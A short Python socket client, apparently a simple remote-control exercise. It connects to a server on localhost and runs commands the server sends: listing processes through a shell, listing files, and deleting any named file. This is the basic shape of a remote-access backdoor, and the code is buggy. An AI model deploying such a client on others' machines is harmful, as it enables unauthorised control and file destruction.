import socket,time,subprocess,os


def Client():
    host = "localhost"
    port = 80
    del_file = "false"

    conn = socket.socket()
    try:
        conn.connect((host,port))
    except:
        print("No connection...")
        time.sleep(5)

    while True:
        data = conn.recv(16384).decode()
        if not data:
            break
        print("cmd: "+str(data))
        if data == "tasklist":
            batcmd = "tasklist"
            result = subprocess.check_output(batcmd, shell=True)
            data = str(result)
            conn.send(data.encode())

        if data == "dir":
            result = os.listdir('.')
            data = str(result)
            conn.send(data.encode())

        if data == "delf":
            data = "del_file"
            conn.send(data.encode())
            del_file = "true"
            
        if del_file == "true":
            try:
                if data != "del_file":
                    if os.path.isfile(data):
                        os.remove(data)
                        data = str(data)
                        data = "The file as been del"
                        conn.send(data.encode())
                        del_file = "false"
                    else:
                        data = str(data)
                        data = "Error ! The file dosn't exist !"
                        conn.send(data.encode())
                        del_file = "false"
            except:
                pass

        data = str(data)
        print("Sending: " + str(data))
        conn.send(data.encode())
    conn.close


        

 
if __name__ == '__main__':
    Client()
